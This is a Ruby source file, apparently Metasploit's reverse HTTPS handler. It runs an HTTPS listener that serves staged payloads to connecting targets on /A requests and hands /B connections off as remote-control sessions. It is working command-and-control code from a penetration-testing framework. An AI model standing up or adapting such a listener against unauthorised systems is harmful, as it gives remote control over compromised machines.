require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttps

	include Msf::Handler

	#
	# Returns the string representation of the handler type, in this case
	# 'reverse_http'.
	#
	def self.handler_type
		return "reverse_https"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Initializes the HTTP SSL tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptString.new('LHOST', [ true, "The local listener hostname" ]),
				OptPort.new('LPORT', [ true, "The local listener port", 8443 ]),
				OptString.new('TARGETID', [ false, "The ID of this specific payload instance (4 bytes max)", Rex::Text.rand_text_alphanumeric(4)]),
			], Msf::Handler::ReverseHttps)
	end

	#
	# Create an HTTPS listener
	#
	def setup_handler
		# Start the HTTPS server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			datastore['LPORT'].to_i,
			datastore['LHOST'],
			true
		)

		# Create a reference to ourselves
		obj = self

		# Add the new resource
		service.add_resource("/",
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req, obj)
			},
			'VirtualDirectory' => true)

		dlog("Reverse HTTPS listener started on http://#{datastore['LHOST']}:#{datastore['LPORT']}/", 'core', LEV_2)

		print_status("HTTPS listener started.")
	end

	#
	# Simply calls stop handler to ensure that things are cool.
	#
	def cleanup_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	#
	# Stops the service and deinitializes it.
	#
	def stop_handler
		Rex::ServiceManager.stop_service(service)
	end

	attr_accessor :service # :nodoc:

protected

	#
	# Parses the HTTPS request
	#
	def on_request(cli, req, obj)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")

		# Process the requested resource.
		case req.relative_resource
			when /\/A(.+)/
				target_id = $1

				print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{target_id} received...")
				resp['Content-Type'] = 'application/octet-stream'


				resp.body = obj.prestage_payload + obj.stage_payload(target_id)


			when /\/B(.+)/
				target_id = $1

				# This is the second connection from the actual stage, hand the socket
				# off to the real payload handler
				print_status("#{cli.peerhost}:#{cli.peerport} Stage connection for target #{target_id} received...")

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, { :skip_ssl => true, :target_id => target_id })

				# Specify this socket as keep-alive to prevent an immediate kill
				cli.keepalive = true

				# Remove this socket from the polled client list in the server
				obj.service.listener.clients.delete(cli)

				return

			else
				resp.code    = 404
				resp.message = "Not found"
		end

		cli.send_response(resp) if (resp)
	end


end

end
end

